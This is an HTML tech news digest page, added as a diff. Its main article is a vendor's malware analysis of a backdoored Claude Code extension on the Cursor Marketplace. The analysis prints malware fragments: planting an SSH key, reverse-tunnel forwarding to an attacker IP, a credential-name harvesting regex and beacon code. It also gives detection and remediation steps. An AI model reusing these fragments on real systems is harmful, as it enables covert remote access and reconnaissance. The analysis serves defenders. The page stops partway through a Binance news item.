@@ -1,0 +1,767 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Tech Digest: October 31, 2026</title>
+    <link rel="stylesheet" href="../style.css">
+</head>
+<body>
+    <header>
+        <h1>Tech Digest</h1>
+        <p class="date">Saturday, October 31, 2026</p>
+        <p class="count">10 Articles</p>
+        <nav>
+            <a href="../">Home</a>
+            <a href="../archive/">Archive</a>
+        </nav>
+    </header>
+    
+    <main>
+        
+        <section class="toc">
+            <h2>Contents</h2>
+            <ol>
+                
+            <li>
+                <a href="#article-1">Backdoor in Claude Code for VS Code extension on the Cursor Marketplace</a>
+                <span class="toc-meta">hackernews - 901 pts</span>
+            </li>
+            
+            <li>
+                <a href="#article-2">Northflank Breached</a>
+                <span class="toc-meta">hackernews - 439 pts</span>
+            </li>
+            
+            <li>
+                <a href="#article-3">The $6.3B Binance hack was pulled off in just 20 minutes</a>
+                <span class="toc-meta">hackernews - 458 pts</span>
+            </li>
+            
+            <li>
+                <a href="#article-4">TRM Labs attributes the Binance hack to North Korea-based TraderTraitor, which drained ~$6.36B fr...</a>
+                <span class="toc-meta">techmeme - 100 pts</span>
+            </li>
+            
+            <li>
+                <a href="#article-5">Seems token recovery already began. Another little detail in addition to the effort described, us...</a>
+                <span class="toc-meta">techmeme - 97 pts</span>
+            </li>
+            
+            <li>
+                <a href="#article-6">Through Captain Jean-Luc Picard, Patrick Stewart taught us the measure of a man</a>
+                <span class="toc-meta">hackernews - 320 pts</span>
+            </li>
+            
+            <li>
+                <a href="#article-7">Our investigators are observing never-seen-before laundering patterns with the stolen funds from ...</a>
+                <span class="toc-meta">techmeme - 94 pts</span>
+            </li>
+            
+            <li>
+                <a href="#article-8">The largest crypto exchange in the world just experienced the largest robbery in human history—an...</a>
+                <span class="toc-meta">techmeme - 91 pts</span>
+            </li>
+            
+            <li>
+                <a href="#article-9">The federated code forge</a>
+                <span class="toc-meta">hackernews - 292 pts</span>
+            </li>
+            
+            <li>
+                <a href="#article-10">Binance says it has reserved $6.34B+ in company funds, including $5B already held in impacted tok...</a>
+                <span class="toc-meta">techmeme - 88 pts</span>
+            </li>
+            
+            </ol>
+        </section>
+        
+        
+        <section class="ai-summary">
+            <h2>Today's Highlights</h2>
+            <p><strong>Top Stories</strong>  <br/>The recent hack of Binance, the world's largest cryptocurrency exchange, marks a significant event in the digital finance landscape, with $6.3 billion stolen in just 20 minutes. TRM Labs has attributed the attack to a North Korea-based group, TraderTraitor, highlighting the sophisticated and organized nature of this breach. The incident raises critical questions about cybersecurity in the crypto sector and the effectiveness of current security measures, particularly as Binance claims it has set aside $6.34 billion to manage the fallout.</p><p><strong>Key Developments</strong>  <br/>In the wake of the Binance hack, investigators are seeing unprecedented laundering patterns involving the stolen funds, suggesting the attackers have devised complex strategies to obscure their tracks. This incident not only showcases the vulnerabilities in cryptocurrency security but also underscores the need for robust regulatory frameworks and enhanced security protocols to protect both platforms and their users.</p><p>On another front, the Cursor Marketplace faced a severe security breach with a backdoor discovered in the Claude Code VS Code extension. This incident serves as a reminder of the risks associated with third-party software, particularly in developer tools, and highlights the necessity for continuous vigilance and security assessments within the software supply chain.</p><p>Northflank, a cloud infrastructure provider, also reported a breach, further emphasizing the prevalent risks in the tech industry. As organizations increasingly rely on third-party services, the cascading effects of these breaches can have significant ramifications for data integrity and user trust.</p><p><strong>Quick Hits</strong>  </p><p>• A recent article reflects on Patrick Stewart's portrayal of Captain Jean-Luc Picard, emphasizing the character's moral leadership and its impact on culture.</p><p>• A compelling analysis reveals that users pay trading fees on Binance in the tokens they trade, which may complicate the recovery process post-hack.</p><p>• Observations of laundering patterns from the Binance exploit reveal thousands of rapid transactions, indicating a sophisticated laundering approach.</p><p>• A discussion on federated code forges highlights an emerging trend in collaborative software development, which could influence future coding practices.</p><p>The landscape of tech security is evolving rapidly, with high-profile breaches underscoring the vulnerabilities that continue to challenge both established and emerging platforms.</p>
+            <div class="ai-disclaimer">
+                This summary was generated by AI (GPT-4o-mini)
+            </div>
+        </section>
+        
+        
+        <article id="article-1">
+            <h2>Backdoor in Claude Code for VS Code extension on the Cursor Marketplace</h2>
+            <div class="article-meta"><span class="source-badge">hackernews</span> • <span class="article-score">901 points</span> • by _chall • October 30, 2026</div>
+            <div class="article-content">
+                <html>
+  <body>
+    <h2>TL;DR</h2>
+    <p>Phorion has detected a backdoor in the official Claude Code for VS Code extension bundle on the Cursor Marketplace that drops a persistent SSH backdoor across macOS, Linux, and Windows. This write-up focuses primarily on macOS, where the extension attempts to configure an SSH backdoor and establish persistence.</p>
+    <p>Organisations should immediately review their environments for use of Claude Code for VSCode <pre>2.1.312</pre> or <pre>2.1.313</pre> and engage incident response where use of the extension is discovered.</p>
+    <blockquote>
+      <p><strong>Update (31 October 2026):</strong> <a href="https://cursor.com/blog/claude-code-extension-security-notice">Cursor’s security notice</a> now identifies versions <pre>2.1.312</pre> and <pre>2.1.313</pre> distributed through the Cursor Marketplace for macOS and Windows as affected. This advisory previously identified only <pre>2.1.313</pre>; the affected-version guidance below has been updated accordingly.</p>
+    </blockquote>
+    <p>Phorion has discovered a compromise of the official <strong>Claude Code for VS Code</strong> extension on the Cursor Marketplace, where the backdoored extension bundle contains a persistent Secure Shell (SSH) backdoor. Cursor has removed the affected versions, <pre>2.1.312</pre> and <pre>2.1.313</pre>, from its marketplace.</p>
+    <p>While the implant includes setup and persistence logic for <strong>macOS, Linux, and Windows</strong>, we’re going to focus primarily on <strong>macOS</strong> in this post, calling out the key differences and a few implementation bugs on the other platforms along the way.</p>
+    <p>The Cursor Marketplace serves extensions for the Cursor editor. Because extensions run with the permissions of the IDE and the user running it, a backdoored extension gets immediate access to local files, source code, and developer tooling as soon as its module is loaded.</p>
+    <p>Notably, Phorion has discovered a likely oversight in how the malware tries to turn on SSH. The setup logic assumes it can check the current Remote Login state without root privileges. When run as a standard user, <pre>systemsetup -getremotelogin</pre> prints an administrator-access error and exits with status <pre>0</pre> instead of returning <pre>Off</pre>. Because the script only tries to enable SSH if the output matches <pre>Off</pre>, it skips the enablement step entirely. On a Mac that doesn’t already have SSH running, that mistake breaks the inbound access path, even though the SSH keys and persistence still get dropped.</p>
+    <p>In this post, we’ll walk through how the backdoor works, why that macOS check fails, and what to look for across your fleet. The goal of this payload is long-term interactive access, and whilst the SSH backdoor bug minimises impact on macOS, the malware is still a significant threat that installs persistence and beacons host reconnaissance back to the operator.</p>
+    <h2>Infection Chain</h2>
+    <h3>The Cursor Marketplace Extension</h3>
+    <p>The compromised <pre>extension.js</pre> file starts with an injected immediately invoked function expression (IIFE) prepended to the minified extension bundle. The rest of the bundle looks like the standard extension, with Claude Code and VS Code strings, normal <pre>activate</pre> and <pre>deactivate</pre> exports, and UI code.</p>
+    <p>The injected prefix pulls in standard Node.js modules (<pre>child_process</pre>, <pre>fs</pre>, <pre>os</pre>, <pre>path</pre>, <pre>http</pre>, and <pre>crypto</pre>) and executes as soon as Node loads the file, before the extension’s normal <pre>activate</pre> callback even runs. The user doesn’t need to interact with the extension for the payload to fire.</p>
+    <h3>Stage 1 - Preparing SSH Access</h3>
+    <p>First, the payload makes sure <pre>~/.ssh</pre> exists and appends an attacker-controlled Ed25519 public key to <pre>~/.ssh/authorized_keys</pre>, setting permissions to <pre>0700</pre> on the directory and <pre>0600</pre> on the file.</p>
+    <p>The key uses the comment <pre>svc-telemetry</pre>. Before appending, the script checks whether <pre>svc-telemetry</pre> is already in the file rather than checking for the key itself. When hunting for this activity, it’s worth checking the public-key fingerprint rather than relying solely on the comment string.</p>
+    <pre>
+      <pre>var sd = path.join(HOME, ".ssh"),
+    ak = path.join(sd, "authorized_keys");
+// ...
+if (cur.indexOf("svc-telemetry") &lt; 0) {
+  fs.appendFileSync(ak, PUB + "\n");
+  d.sshKey = "added"
+} else {
+  d.sshKey = "present"
+}
+</pre>
+    </pre>
+    <p>Here, <pre>cur</pre> holds the existing contents of <pre>authorized_keys</pre>, and <pre>PUB</pre> is the embedded attacker public key (redacted here).</p>
+    <p>With the key in place, anyone holding the matching private key can authenticate as that user, provided SSH is actually running. The next step in the script tries to make sure the local SSH daemon is enabled and listening:</p>
+    <ul>
+      <li><strong>Linux:</strong> tries to enable and start <pre>sshd</pre> or <pre>ssh</pre> via <pre>systemctl</pre>, falling back to <pre>service</pre> and <pre>/etc/init.d/</pre>.</li>
+      <li><strong>macOS:</strong> checks Remote Login and, if it reports <pre>Off</pre>, tries to enable it via <pre>sudo -n systemsetup -setremotelogin on</pre>.</li>
+      <li><strong>Windows:</strong> tries to install and start OpenSSH Server using PowerShell.</li>
+    </ul>
+    <p>None of these steps include a privilege escalation exploit. Non-interactive <pre>sudo -n</pre> will fail unless the user already has passwordless sudo cached or configured, so starting a system service won’t always succeed from a standard user context.</p>
+    <p>It looks like the Windows code path also has its own bug: it passes the PowerShell service setup command through a helper function (<pre>det()</pre>) that hardcodes <pre>/bin/sh</pre>, which isn’t going to get very far on a standard Windows install.</p>
+    <h3>A bug in the macOS SSH logic?</h3>
+    <p>On macOS, the setup may run into problems before it even gets to the <pre>sudo</pre> command. The script runs <pre>systemsetup -getremotelogin</pre> without elevation and tests the output against <pre>/Off/i</pre>. It only tries to enable Remote Login if the output contains <pre>Off</pre>:</p>
+    <pre>
+      <pre>// ...
+else if (PLAT === "darwin") {
+  var rl = ex("systemsetup -getremotelogin 2&gt;/dev/null", 4000);
+  d.remoteLogin = rl;
+  if (/Off/i.test(rl)) {
+    det("sudo -n systemsetup -setremotelogin on &gt;/dev/null 2&gt;&amp;1");
+    d.remoteLoginOn = "tried"
+  }
+}
+</pre>
+    </pre>
+    <p>Notice that the second command (<pre>-setremotelogin on</pre>) uses <pre>sudo -n</pre>, while the first command (<pre>-getremotelogin</pre>) doesn’t. When you run <pre>systemsetup -getremotelogin</pre> as a standard user on macOS, you get this instead:</p>
+    <pre>
+      <pre>You need administrator access to run this tool... exiting!
+</pre>
+    </pre>
+    <p><pre>systemsetup</pre> refuses to read the setting without administrator privileges, prints the error to stdout, and exits with status <pre>0</pre>. The malware’s <pre>ex()</pre> helper grabs stdout and returns it:</p>
+    <pre>
+      <pre>function ex(c, t) {
+  try {
+    return cp.execSync(c, {
+      timeout: t || 3000,
+      stdio: ["ignore", "pipe", "ignore"],
+      windowsHide: true
+    }).toString().trim()
+  } catch (e) {
+    return ""
+  }
+}
+</pre>
+    </pre>
+    <p>Because the output is <pre>"You need administrator access to run this tool... exiting!"</pre>, <pre>/Off/i.test(rl)</pre> evaluates to <pre>false</pre>.</p>
+    <p>As a result, the script skips the <pre>if</pre> block and never runs <pre>sudo -n systemsetup -setremotelogin on</pre>. It effectively treats “I don’t have permission to check if SSH is off” as “SSH is already on”, which also explains why you won’t see the enablement attempt in process telemetry when the extension runs as a normal user.</p>
+    <blockquote>
+      <p><strong>This bug can break the final step of the access chain.</strong> If Remote Login isn’t already enabled on the Mac, the outbound tunnel can still connect to the attacker’s server, but any traffic forwarded back through the tunnel will hit a closed port 22 on localhost.</p>
+    </blockquote>
+    <p>Of course, that isn’t something to rely on as a defence. If the user already had Remote Login enabled, or turns it on later, the backdoor is ready and waiting.</p>
+    <h3>Stage 2 - Establishing the Reverse SSH Tunnel</h3>
+    <p>Next, the script sets up an outbound SSH connection to <pre>134.209.82[.]225</pre> as the <pre>tunnel</pre> user on port 22. To authenticate to the attacker’s server, it decodes a separate embedded private key: an unencrypted OpenSSH Ed25519 key with the comment <pre>svc-telemetry-tun</pre>.</p>
+    <p>It’s worth keeping the two keys straight during an investigation:</p>
+    <ul>
+      <li>The public key added to <pre>~/.ssh/authorized_keys</pre> (<pre>svc-telemetry</pre>) lets the attacker log into the victim’s machine.</li>
+      <li>The embedded private key (<pre>svc-telemetry-tun</pre>) lets the victim’s machine connect out to the attacker’s tunnel server.</li>
+    </ul>
+    <p>The script writes this tunnel key to the OS temporary directory with a filename starting with <pre>.stk_</pre>, followed by the first ten characters of the MD5 hash of the hostname and home directory path:</p>
+    <pre>
+      <pre>var kf = path.join(
+  TMP,
+  ".stk_" + crypto.createHash("md5")
+    .update(String(os.hostname()) + HOME).digest("hex").slice(0, 10)
+);
+// ...
+var RF = (PLAT === "win32") ? "\"*:0:localhost:22\"" : "'*:0:localhost:22'";
+</pre>
+    </pre>
+    <p>The tunnel uses <pre>-R *:0:localhost:22</pre> for remote port forwarding. Passing <pre>0</pre> asks the attacker’s SSH server to dynamically allocate a listening port and forward any traffic hitting it back through the tunnel to <pre>localhost:22</pre> on the victim’s machine:</p>
+    <pre>
+      <pre>Affected host -- outbound SSH tunnel --&gt; External SSH server
+
+Operator -- separate connection --&gt; Server's allocated port
+                                            |
+                                 Through the existing tunnel
+                                            |
+                                            v
+                                  Affected host's SSH:22
+                                            |
+                                  Login using the planted key
+</pre>
+    </pre>
+    <p>Because the tunnel runs with <pre>-N</pre>, it just holds the port forward open without executing a command on the remote server. When the operator wants to access the machine, they start a separate SSH session through the allocated port on their server, authenticating against the victim’s local SSH daemon using the key planted in Stage 1. That gives them a full interactive shell and file transfer capability without needing any custom C2 command handling in the JavaScript itself.</p>
+    <p>The SSH command also passes flags to keep the connection quiet and non-interactive: host-key checking is disabled, <pre>known_hosts</pre> is ignored, <pre>BatchMode</pre> and <pre>IdentitiesOnly</pre> are enabled, keepalives are set to 30 seconds (<pre>ServerAliveCountMax=3</pre>), and <pre>ExitOnForwardFailure</pre> is turned on.</p>
+    <p>If <pre>autossh</pre> is installed, the script uses it; otherwise it falls back to standard <pre>ssh</pre>. It wraps the connection in a detached retry loop that sleeps for 60 seconds between attempts, using <pre>pgrep</pre> on Unix systems to avoid spinning up duplicate initial tunnels. Because the loop is detached, the tunnel stays up even after the user closes their IDE.</p>
+    <h3>Stage 3 - Keeping Access Available</h3>
+    <p>To survive a reboot, the script sets up platform-specific persistence alongside the initial detached tunnel:</p>
+    <table>
+      <tr>
+        <th>Platform</th>
+        <th>Artifacts</th>
+        <th>Persistence mechanism</th>
+        <th>Notes</th>
+      </tr>
+      <tr>
+        <td>Linux</td>
+        <td><pre>~/.config/.smt</pre>, <pre>~/.config/.smtk</pre></td>
+        <td>Writes a shell script that recreates the tunnel key and loops the SSH connection, then adds an <pre>@reboot</pre> entry to the user’s crontab.</td>
+        <td>Contains a bug in the crontab check that can wipe existing user cron jobs on repeat runs (detailed below).</td>
+      </tr>
+      <tr>
+        <td>macOS</td>
+        <td><pre>~/.config/.smt</pre>, <pre>~/.config/.smtk</pre>, <pre>~/Library/LaunchAgents/com.apple.sysmond.plist</pre></td>
+        <td>Writes a user LaunchAgent that runs <pre>/bin/sh ~/.config/.smt</pre> with <pre>RunAtLoad</pre> and <pre>KeepAlive</pre> set to <pre>true</pre>, then loads it via <pre>launchctl</pre>.</td>
+        <td>Runs in the user context rather than as a root LaunchDaemon.</td>
+      </tr>
+      <tr>
+        <td>Windows</td>
+        <td><pre>~/.config/smt.cmd</pre>, <pre>~/.config/smtk</pre>, <pre>%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/sysmon.cmd</pre></td>
+        <td>Tries to create a scheduled task named <pre>SysMon</pre> running as <pre>SYSTEM</pre> on startup. If that fails, drops <pre>sysmon.cmd</pre> into the user’s Startup folder.</td>
+        <td>Creating a <pre>SYSTEM</pre> task requires admin privileges; the Startup folder fallback runs as the user at login.</td>
+      </tr>
+    </table>
+    <p>On macOS and Linux, the <pre>~/.config/.smt</pre> script has the tunnel private key embedded inside it and writes it out to <pre>~/.config/.smtk</pre> before starting the reconnection loop.</p>
+    <p>On macOS, the LaunchAgent disguises itself as <pre>com.apple.sysmond.plist</pre> inside <pre>~/Library/LaunchAgents/</pre>:</p>
+    <pre>
+      <pre>&lt;key&gt;Label&lt;/key&gt;
+&lt;string&gt;com.apple.sysmond&lt;/string&gt;
+&lt;!-- ... --&gt;
+&lt;key&gt;RunAtLoad&lt;/key&gt;
+&lt;true/&gt;
+&lt;key&gt;KeepAlive&lt;/key&gt;
+&lt;true/&gt;
+</pre>
+    </pre>
+    <h3>Stage 4 - Host Recon</h3>
+    <p>Finally, the script gathers basic host reconnaissance and sends a one-off beacon back to the attacker’s server:</p>
+    <ul>
+      <li>Hostname, username, OS platform, and architecture</li>
+      <li>Home directory, current working directory, and global Git email (<pre>git config --global user.email</pre>)</li>
+      <li>Public IP address and status flags from each setup stage (e.g. whether the SSH key was added and which persistence method ran)</li>
+      <li>Up to 40 environment variable <strong>names</strong> (not values) matching <pre>/KEY|TOKEN|SECRET|PASS|AWS|GCP/i</pre></li>
+    </ul>
+    <p>The environment variable check uses <pre>Object.keys(process.env)</pre>:</p>
+    <pre>
+      <pre>Object.keys(process.env)
+  .filter(function(k) {
+    return /KEY|TOKEN|SECRET|PASS|AWS|GCP/i.test(k)
+  })
+  .slice(0, 40)
+</pre>
+    </pre>
+    <p>Because it only grabs the variable names, the beacon doesn’t exfiltrate the secret values themselves. Instead, it gives the operator a quick inventory of which cloud credentials or API tokens live on the machine so they know which hosts to prioritise.</p>
+    <p>To get the machine’s public IP, the script queries <pre>ifconfig[.]me</pre>, falling back to <pre>api[.]ipify[.]org</pre>.</p>
+    <p>It then sends the JSON report via plaintext HTTP POST requests to <pre>/beacon</pre> on both <pre>134.209.82[.]225:8099</pre> and <pre>127.0.0.1:8099</pre>:</p>
+    <pre>
+      <pre>var r = http.request({
+  host: h,
+  port: p,
+  path: "/beacon",
+  method: "POST",
+  timeout: 3000,
+  headers: {"content-type": "application/json"}
+}, function(res) {
+  res.resume()
+});
+// ...
+r.write(JSON.stringify(d));
+r.end()
+</pre>
+    </pre>
+    <p>Why it also sends a copy of the beacon to <pre>127.0.0.1:8099</pre> isn’t clear from the sample; the script itself doesn’t set up a local listener on that port.</p>
+    <p>The beacon is scheduled once with <pre>setTimeout</pre> (1.5 seconds after the initial setup runs) and discards any HTTP response with <pre>res.resume()</pre>. It’s purely a check-in to let the operator know the host is ready, while the SSH tunnel handles the actual access.</p>
+    <h2>Detection Opportunities</h2>
+    <p>From a detection standpoint, there are several behaviours in this chain that stand out on macOS using Endpoint Security Framework (ESF) telemetry.</p>
+    <h3>SSH Key and Configuration Changes</h3>
+    <p>Because the malware appends to <pre>~/.ssh/authorized_keys</pre> directly using Node’s <pre>fs.appendFileSync</pre>, process-only rules watching for shell commands like <pre>echo</pre> or <pre>tee</pre> touching <pre>authorized_keys</pre> won’t catch it. This is where file modification telemetry is essential: watching for IDE helper processes (<pre>Code Helper</pre>, <pre>Cursor Helper</pre>, etc.) creating or writing to <pre>~/.ssh/authorized_keys</pre>.</p>
+    <p>Even though the IDE binary itself is validly signed, its extension host process has no business modifying SSH authentication files in the background.</p>
+    <p>While you should also monitor for <pre>systemsetup -setremotelogin on</pre>, don’t rely on it as a required condition for alerting on this campaign. As we saw above, the broken state check on macOS means that command often won’t run at all.</p>
+    <h3>User LaunchAgent Persistence</h3>
+    <p>The persistence setup on macOS gives us a couple of strong signals:</p>
+    <ul>
+      <li>A non-Apple process writing a plist with a <pre>com.apple.*</pre> label (<pre>~/Library/LaunchAgents/com.apple.sysmond.plist</pre>).</li>
+      <li>A LaunchAgent configured to execute <pre>/bin/sh</pre> against a hidden script in the user’s home directory (<pre>~/.config/.smt</pre>).</li>
+    </ul>
+    <p>Because the initial tunnel is spawned as a detached process and <pre>launchd</pre> later manages <pre>.smt</pre> directly, the subsequent <pre>ssh</pre> processes won’t have the IDE as their immediate parent in a live process tree. Correlating the file creation of <pre>.smt</pre> and <pre>com.apple.sysmond.plist</pre> back to the IDE extension host makes it much easier to piece the chain together.</p>
+    <h3>SSH Tunnels and Follow-On Access</h3>
+    <p>On the process and network side, look for:</p>
+    <ul>
+      <li><pre>ssh</pre> or <pre>autossh</pre> launched with remote port forwarding (<pre>-R *:0:localhost:22</pre>) and identity files pulled from <pre>/tmp/.stk_*</pre> or <pre>~/.config/.smtk</pre>.</li>
+      <li>Outbound SSH connections to <pre>134.209.82[.]225</pre> on port 22, alongside HTTP POST requests to <pre>134.209.82[.]225:8099</pre> (and connection attempts to <pre>127.0.0.1:8099</pre>).</li>
+    </ul>
+    <p>If you find a host where this extension ran, it’s important to check whether the tunnel was merely established or whether an operator actually logged in through it. Because inbound sessions arrive through the local port forward, successful logins in SSH logs will appear to come from <pre>localhost</pre> (<pre>127.0.0.1</pre> or <pre>::1</pre>) authenticating with the <pre>svc-telemetry</pre> key.</p>
+    <h3>Remediation</h3>
+    <p>If you identify an affected machine, <strong>uninstalling the extension alone won’t remove the backdoor</strong>. Make sure your response covers all of the stages it drops:</p>
+    <ul>
+      <li><strong>Kill active tunnel processes:</strong> Terminate the <pre>/bin/sh</pre> retry loop and any <pre>ssh</pre> or <pre>autossh</pre> processes connecting to <pre>134.209.82[.]225</pre>.</li>
+      <li><strong>Remove persistence:</strong> Unload and delete <pre>~/Library/LaunchAgents/com.apple.sysmond.plist</pre> on macOS (or clean up the <pre>@reboot</pre> cron entry on Linux / <pre>SysMon</pre> scheduled task and Startup script on Windows), and remove <pre>~/.config/.smt</pre> and <pre>~/.config/.smtk</pre>.</li>
+      <li><strong>Clean up SSH keys and state:</strong> Remove the <pre>svc-telemetry</pre> public key from <pre>~/.ssh/authorized_keys</pre>, delete <pre>/tmp/.stk_*</pre>, and verify that Remote Login (SSH) hasn’t been enabled unexpectedly.</li>
+      <li><strong>Rotate credentials:</strong> If SSH was enabled on the host, or if there’s any evidence of an inbound login, rotate any credentials or tokens that were accessible to that user account (especially those matching the <pre>KEY|TOKEN|SECRET|PASS|AWS|GCP</pre> environment variable filter).</li>
+    </ul>
+    <h2>Phorion’s Approach</h2>
+    <p>Phorion’s out-of-the-box detection coverage flags the macOS persistence used in this attack across multiple rules, including non-Apple processes creating <pre>com.apple.*</pre> LaunchAgents and LaunchAgents executing shell scripts from hidden directories.</p>
+    <p>Beyond persistence, Phorion’s file access telemetry captures the IDE extension host modifying <pre>~/.ssh/authorized_keys</pre> directly, and <a href="https://phorion.io/blog/phorion-protections/">Phorion Protections</a> can be used to lock down <pre>~/.ssh/</pre> so that only authorised processes can read or modify SSH keys and configuration files in the first place.</p>
+    <p>If you want to see how Phorion detects and blocks supply chain threats like this across your Mac fleet, <a href="https://phorion.io#cta">get in touch to arrange a demo</a>.</p>
+    <h2>Indicators</h2>
+    <h3>Sample and Public-Key Fingerprints</h3>
+    <table>
+      <tr>
+        <th>Indicator</th>
+        <th>Value</th>
+        <th>Notes</th>
+      </tr>
+      <tr>
+        <td>SHA-256</td>
+        <td>
+          <pre>ecb58cb29078d9646ad1dcdbe51526f2d9cfea06be5fb2ab183e8ecc3ab6bf15</pre>
+        </td>
+        <td>Backdoored <pre>extension.js</pre> bundle</td>
+      </tr>
+      <tr>
+        <td>Victim-login public-key fingerprint</td>
+        <td>
+          <pre>SHA256:0Z6R+DF64Do2nwQic8a7kkfDLNNk4IiK+2U2Rci4htk</pre>
+        </td>
+        <td>Ed25519 key appended to <pre>~/.ssh/authorized_keys</pre> (comment <pre>svc-telemetry</pre>)</td>
+      </tr>
+      <tr>
+        <td>Tunnel public-key fingerprint</td>
+        <td>
+          <pre>SHA256:KOAU57+ZG6u3MG4WwzPzPX2O5YEe9qdOC1Bl+6MVyDQ</pre>
+        </td>
+        <td>Embedded Ed25519 key used to authenticate to the tunnel server (comment <pre>svc-telemetry-tun</pre>)</td>
+      </tr>
+    </table>
+    <h3>Network Indicators</h3>
+    <table>
+      <tr>
+        <th>Indicator</th>
+        <th>Type</th>
+        <th>Notes</th>
+      </tr>
+      <tr>
+        <td><pre>134.209.82[.]225</pre> (TCP <pre>22</pre>, user <pre>tunnel</pre>)</td>
+        <td>IP / SSH</td>
+        <td>Outbound reverse SSH tunnel server</td>
+      </tr>
+      <tr>
+        <td><pre>134.209.82[.]225:8099</pre> (<pre>POST /beacon</pre>)</td>
+        <td>IP / HTTP</td>
+        <td>External host-report beacon endpoint</td>
+      </tr>
+      <tr>
+        <td><pre>127.0.0.1:8099</pre> (<pre>POST /beacon</pre>)</td>
+        <td>Loopback / HTTP</td>
+        <td>Local beacon destination</td>
+      </tr>
+      <tr>
+        <td><pre>ifconfig[.]me</pre>, <pre>api[.]ipify[.]org</pre></td>
+        <td>Domain</td>
+        <td>Legitimate services queried for public IP discovery</td>
+      </tr>
+    </table>
+    <h3>Host Artifacts</h3>
+    <table>
+      <tr>
+        <th>Artifact</th>
+        <th>Platform</th>
+        <th>Notes</th>
+      </tr>
+      <tr>
+        <td>
+          <pre>~/.&lt;ide&gt;/extensions/anthropic.claude-code-2.1.312-darwin-arm64</pre>
+        </td>
+        <td>macOS (Apple Silicon)</td>
+        <td>Additional affected version identified in Cursor’s security notice (<pre>&lt;ide&gt;</pre> varies by editor)</td>
+      </tr>
+      <tr>
+        <td>
+          <pre>~/.&lt;ide&gt;/extensions/anthropic.claude-code-2.1.313-darwin-arm64</pre>
+        </td>
+        <td>macOS (Apple Silicon)</td>
+        <td>Installed extension directory (<pre>&lt;ide&gt;</pre> varies by editor)</td>
+      </tr>
+      <tr>
+        <td><pre>~/.ssh/authorized_keys</pre> (comment <pre>svc-telemetry</pre>)</td>
+        <td>All</td>
+        <td>Planted Ed25519 public key</td>
+      </tr>
+      <tr>
+        <td><pre>&lt;TMP&gt;/.stk_&lt;10 hex chars&gt;</pre> (<pre>$TMPDIR/.stk_*</pre> on macOS)</td>
+        <td>All</td>
+        <td>Initial tunnel private key in the OS temporary directory (suffix is first 10 hex chars of <pre>MD5(hostname + HOME)</pre>)</td>
+      </tr>
+      <tr>
+        <td><pre>~/.config/.smt</pre> and <pre>~/.config/.smtk</pre></td>
+        <td>macOS, Linux</td>
+        <td>Persistence shell script and recreated tunnel private key</td>
+      </tr>
+      <tr>
+        <td>
+          <pre>~/Library/LaunchAgents/com.apple.sysmond.plist</pre>
+        </td>
+        <td>macOS</td>
+        <td>User LaunchAgent executing <pre>/bin/sh ~/.config/.smt</pre></td>
+      </tr>
+      <tr>
+        <td><pre>@reboot</pre> cron entry for <pre>~/.config/.smt</pre></td>
+        <td>Linux</td>
+        <td>User crontab persistence</td>
+      </tr>
+      <tr>
+        <td><pre>~/.config/smt.cmd</pre> and <pre>~/.config/smtk</pre></td>
+        <td>Windows</td>
+        <td>Persistence batch script and tunnel private key</td>
+      </tr>
+      <tr>
+        <td>Scheduled task <pre>SysMon</pre></td>
+        <td>Windows</td>
+        <td>Startup scheduled task (requests <pre>SYSTEM</pre>)</td>
+      </tr>
+      <tr>
+        <td>
+          <pre>%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/sysmon.cmd</pre>
+        </td>
+        <td>Windows</td>
+        <td>Startup folder fallback script</td>
+      </tr>
+    </table>
+  </body>
+</html>
+            </div>
+            
+            <div class="article-link">
+                <strong>Original:</strong> <a href="https://phorion.io/blog/offical-claude-code-vsx-compromise/">https://phorion.io/blog/offical-claude-code-vsx-compromise/</a>
+            </div>
+            
+        </article>
+        
+        <article id="article-2">
+            <h2>Northflank Breached</h2>
+            <div class="article-meta"><span class="source-badge">hackernews</span> • <span class="article-score">439 points</span> • by js4ever • October 30, 2026</div>
+            <div class="article-content">
+                <html>
+  <body>
+    <p>We have enabled audit logs for all customers, including free users.</p>
+    <p>Update · UTC</p>
+    <p>Users have reported unauthorised use of AI API keys supplied to the Northflank platform.</p>
+    <p>If you have not already rotated your user-provided secrets stored in Northflank, please do so immediately. Revoke existing credentials with their issuing providers, generate replacements, and update the affected secrets and workloads in Northflank. Review your AI provider usage and billing logs for unexpected activity, and report any suspicious usage to Northflank support and the relevant provider.</p>
+    <p>These reports may be consistent with the broader pattern of attacks targeting AI credentials. Similar IP addresses are contained in this article Wiz’s “Black October” report.</p>
+    <p>Update · UTC</p>
+    <p>Our investigation is ongoing. We have no further confirmed findings to share at this time.</p>
+    <p>Our guidance remains unchanged: assume all environment variables have been compromised and rotate all secrets and credentials immediately, including those in workloads, secret groups and global secrets. Disable public access to addons where enabled.</p>
+    <p>We will share further updates as more information is confirmed.</p>
+    <p>Update · UTC</p>
+    <p>Secret rotation on Postgres and MongoDB has been enabled for all users. We recommend disabling public expose on addons if you have enabled that.</p>
+    <p>All users should assume their environment variables are decrypted and begin rotation immediately.</p>
+    <p>Secrets on workloads</p>
+    <p>Secret groups</p>
+    <p>Global secrets</p>
+    <p>Multiple users are confirming that their AI keys have been used.</p>
+    <p>Identified · UTC</p>
+    <p>Assume all environment variables have been decrypted. Disable/rotate all keys.</p>
+  </body>
+</html>
+            </div>
+            
+            <div class="article-link">
+                <strong>Original:</strong> <a href="https://status.northflank.com">https://status.northflank.com</a>
+            </div>
+            
+        </article>
+        
+        <article id="article-3">
+            <h2>The $6.3B Binance hack was pulled off in just 20 minutes</h2>
+            <div class="article-meta"><span class="source-badge">hackernews</span> • <span class="article-score">458 points</span> • by domhudson • October 30, 2026</div>
+            <div class="article-content">
+                
+            <div class="summary-only">
+                <p><em>Full article not available - showing summary only.</em></p>
+                <p>Score: 458 | Comments: 312</p>
+            </div>
+            
+            </div>
+            
+            <div class="article-link">
+                <strong>Original:</strong> <a href="https://www.wired.com/story/the-dollar63-billion-binance-hack-was-pulled-off-in-just-20-minutes/">https://www.wired.com/story/the-dollar63-billion-binance-hack-was-pulled-off-in-just-20-minutes/</a>
+            </div>
+            
+        </article>
+        
+        <article id="article-4">
+            <h2>TRM Labs attributes the Binance hack to North Korea-based TraderTraitor, which drained ~$6.36B from Binance wallets across 10 blockchains, mostly in ~20 minutes</h2>
+            <div class="article-meta"><span class="source-badge">techmeme</span> • <span class="article-score">100 points</span> • October 31, 2026</div>
+            <div class="article-content">
+                
+            <div class="summary-only">
+                <p><em>Full article not available - showing summary only.</em></p>
